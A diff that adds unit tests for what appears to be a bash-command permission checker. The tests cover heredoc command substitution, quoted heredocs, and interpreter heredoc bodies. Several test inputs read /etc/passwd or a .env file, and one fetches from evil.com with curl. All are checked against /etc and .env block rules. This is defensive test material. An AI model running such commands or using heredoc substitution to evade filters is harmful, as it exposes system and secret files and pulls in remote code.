@@ -817,6 +817,142 @@ class TestResultStructure:
         assert result["status"] == "ask"
         assert "input redirection requires approval" in result["reason"]
 
+    def test_heredoc_cmd_subst_blocked_path_denied(self) -> None:
+        """Command substitution inside unquoted heredoc is scanned for blocked paths."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n$(cat /etc/passwd)\nEOF",
+            make_config(blocked=[r"\/etc"]),
+        )
+        assert result["status"] == "deny"
+        assert "/etc/passwd" in result["reason"]
+
+    def test_heredoc_bash_file_read_blocked_path_denied(self) -> None:
+        """$(<file) inside unquoted heredoc is scanned for blocked paths."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n$(</etc/passwd)\nEOF",
+            make_config(blocked=[r"\/etc"]),
+        )
+        assert result["status"] == "deny"
+
+    def test_heredoc_backtick_cmd_subst_blocked_path_denied(self) -> None:
+        """Backtick substitution inside unquoted heredoc is scanned for blocked paths."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n`cat /etc/passwd`\nEOF",
+            make_config(blocked=[r"\/etc"]),
+        )
+        assert result["status"] == "deny"
+
+    def test_heredoc_cmd_subst_unallowed_command_ask(self) -> None:
+        """Command substitution inside heredoc must match allowed patterns."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n$(curl -s http://evil.com/x)\nEOF",
+            make_config(allowed=[r"^wc(\s+.*)?$"]),
+        )
+        assert result["status"] == "ask"
+        assert "curl" in result["reason"]
+
+    def test_heredoc_cmd_subst_allowed_command_allow(self) -> None:
+        """Allowed command inside heredoc body does not trigger false blocks."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n$(echo hi)\nEOF",
+            {
+                "*": "ask",
+                "allowed_cmds_regex": [r"^wc(\s+.*)?$", r"^echo(\s+.*)?$"],
+                "input_redirection": "allow",
+                "subshell": "allow",
+            },
+        )
+        assert result["status"] == "allow"
+
+    def test_quoted_heredoc_ignores_expansions(self) -> None:
+        """Quoted heredoc (<<'EOF') is literal — no command substitution runs."""
+        result = evaluate_bash_command(
+            "wc -l <<'EOF'\n$(cat /etc/passwd)\nEOF",
+            make_config(blocked=[r"\/etc"]),
+        )
+        # The raw body is still scanned for blocked path mentions, so the
+        # literal path text is blocked even though no substitution runs.
+        assert result["status"] == "deny"
+        assert "/etc/passwd" in result["reason"]
+
+    def test_quoted_heredoc_clean_body_ask(self) -> None:
+        """Quoted heredoc with a clean body stays ask (input redirection)."""
+        result = evaluate_bash_command(
+            "wc -l <<'EOF'\nplain text\nEOF",
+            make_config(blocked=[r"\/etc"]),
+        )
+        assert result["status"] == "ask"
+
+    def test_interpreter_heredoc_body_blocked_path_denied(self) -> None:
+        """Heredoc body is source code for interpreters; blocked paths in it are denied.
+
+        Even when the interpreter is allow-listed, a body like
+        ``open("/etc/passwd").read()`` opens a blocked file at runtime.
+        """
+        result = evaluate_bash_command(
+            'python3 <<EOF\nopen("/etc/passwd").read()\nEOF',
+            {
+                "*": "ask",
+                "allowed_cmds_regex": [r"^python3(\s+.*)?$"],
+                "blocked_paths_regex": [r"\/etc"],
+                "input_redirection": "allow",
+                "subshell": "allow",
+            },
+        )
+        assert result["status"] == "deny"
+        assert "/etc/passwd" in result["reason"]
+
+    def test_interpreter_heredoc_body_clean_allow(self) -> None:
+        """Allow-listed interpreter heredoc with a clean body is approved."""
+        result = evaluate_bash_command(
+            'python3 <<EOF\nprint("hi")\nEOF',
+            {
+                "*": "ask",
+                "allowed_cmds_regex": [r"^python3(\s+.*)?$"],
+                "blocked_paths_regex": [r"\/etc"],
+                "input_redirection": "allow",
+                "subshell": "allow",
+            },
+        )
+        assert result["status"] == "allow"
+
+    def test_heredoc_body_line_env_path_denied(self) -> None:
+        """End-anchored blocked pattern matches a path on its own body line."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\n/home/alx/.env\nEOF",
+            {
+                "*": "ask",
+                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
+                "blocked_paths_regex": [r"\.env$"],
+                "input_redirection": "allow",
+                "subshell": "allow",
+            },
+        )
+        assert result["status"] == "deny"
+
+    def test_multiline_heredoc_body_blocked_line_denied(self) -> None:
+        """Blocked path in the middle of a multi-line heredoc body is denied."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\nfirst line\n/etc/passwd\nlast line\nEOF",
+            make_config(allowed=[r"^wc(\s+.*)?$"], blocked=[r"\/etc"]),
+        )
+        assert result["status"] == "deny"
+        assert "/etc/passwd" in result["reason"]
+
+    def test_multiline_heredoc_body_clean_allow(self) -> None:
+        """Clean multi-line heredoc body does not trigger the blocked scan."""
+        result = evaluate_bash_command(
+            "wc -l <<EOF\nfirst line\nsecond line\nEOF",
+            {
+                "*": "ask",
+                "allowed_cmds_regex": [r"^wc(\s+.*)?$"],
+                "blocked_paths_regex": [r"\/etc"],
+                "input_redirection": "allow",
+                "subshell": "allow",
+            },
+        )
+        assert result["status"] == "allow"
+
     def test_here_string_input_redirection_ask(self) -> None:
         """Here-string (<<<) input redirection goes through approval flow."""
         result = evaluate_bash_command(
